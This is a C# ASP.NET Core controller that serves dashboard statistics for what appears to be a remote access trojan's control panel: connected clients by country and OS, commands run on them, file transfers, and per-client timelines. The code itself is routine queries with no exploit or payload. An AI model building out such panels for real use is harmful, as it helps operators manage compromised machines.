using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using WebPanel.Data;
using WebPanel.Models;
using WebPanel.Services;

namespace WebPanel.Controllers;

[ApiController]
[Route("api/[controller]")]
[Authorize]
public class DashboardController : ControllerBase
{
    private readonly RatBridgeService _ratBridge;
    private readonly WebPanelDbContext _context;

    public DashboardController(RatBridgeService ratBridge, WebPanelDbContext context)
    {
        _ratBridge = ratBridge;
        _context = context;
    }

    [HttpGet("stats")]
    public async Task<ActionResult<DashboardStats>> GetStats()
    {
        var clients = _ratBridge.GetConnectedClients().ToList();
        var onlineCount = clients.Count(c => c.IsConnected);
        var totalCount = await _context.ClientSessions.CountAsync();
        
        var today = DateTime.UtcNow.Date;
        var commandsToday = await _context.CommandHistory
            .Where(h => h.ExecutedAt >= today)
            .CountAsync();

        var transfersToday = await _context.FileTransfers
            .Where(f => f.StartedAt >= today)
            .CountAsync();

        var clientsByCountry = clients
            .GroupBy(c => c.Country)
            .ToDictionary(g => g.Key, g => g.Count());

        var clientsByOS = clients
            .GroupBy(c => c.OS)
            .ToDictionary(g => g.Key, g => g.Count());

        return Ok(new DashboardStats
        {
            TotalClients = totalCount,
            OnlineClients = onlineCount,
            OfflineClients = totalCount - onlineCount,
            CommandsToday = commandsToday,
            FileTransfersToday = transfersToday,
            ClientsByCountry = clientsByCountry,
            ClientsByOS = clientsByOS
        });
    }

    [HttpGet("recent-activity")]
    public async Task<IActionResult> GetRecentActivity([FromQuery] int limit = 50)
    {
        var recentCommands = await _context.CommandHistory
            .OrderByDescending(h => h.ExecutedAt)
            .Take(limit)
            .Select(h => new
            {
                Type = "Command",
                h.ClientId,
                h.Command,
                h.ExecutedBy,
                Timestamp = h.ExecutedAt,
                h.Success
            })
            .ToListAsync();

        return Ok(recentCommands);
    }

    [HttpGet("client-timeline/{clientId}")]
    public async Task<IActionResult> GetClientTimeline(string clientId, [FromQuery] int days = 7)
    {
        var since = DateTime.UtcNow.AddDays(-days);

        var sessions = await _context.ClientSessions
            .Where(s => s.ClientId == clientId && s.ConnectedAt >= since)
            .OrderBy(s => s.ConnectedAt)
            .ToListAsync();

        var commands = await _context.CommandHistory
            .Where(h => h.ClientId == clientId && h.ExecutedAt >= since)
            .OrderBy(h => h.ExecutedAt)
            .ToListAsync();

        return Ok(new
        {
            Sessions = sessions,
            Commands = commands
        });
    }
}
